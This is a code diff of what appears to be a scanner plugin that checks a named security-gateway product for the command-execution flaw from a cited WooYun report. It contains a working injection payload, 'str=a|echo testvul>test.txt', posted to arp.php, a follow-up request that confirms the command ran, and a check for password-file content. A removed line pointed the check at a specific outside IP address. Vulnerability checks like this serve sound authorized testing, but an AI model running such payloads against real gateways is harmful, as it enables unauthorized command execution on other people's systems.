@@ -6,7 +6,7 @@ author: yichin
 name: 远为应用安全网关(&国富安应用安全网关)命令执行
 refer: http://www.wooyun.org/bugs/wooyun-2015-0130878
 description:
-    
+
 '''
 
 import re
@@ -33,6 +33,7 @@ def audit(arg):
         code, head, res, err, _ = curl.curl2(url, post, header=content_type)
         if(code == 200) and ('root:' in res):
             security_hole('Command execution: ' + url + 'POST: ' +post)
+            return arg
     #无回显
     url  = arg + 'tools/fault/arp.php'
     post = 'str=a|echo%20testvul>test.txt'
@@ -41,7 +42,8 @@ def audit(arg):
         code, head, res, err, _ = curl.curl2(arg + 'tools/fault/test.txt')
         if(code == 200) and ('testvul' in res):
             security_hole('Command execution: ' + url + 'POST: ' +post)
-    
-if __name__ == '__main__':
+
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('yuanwei_gateway','http://222.170.47.230:8888/')[1])
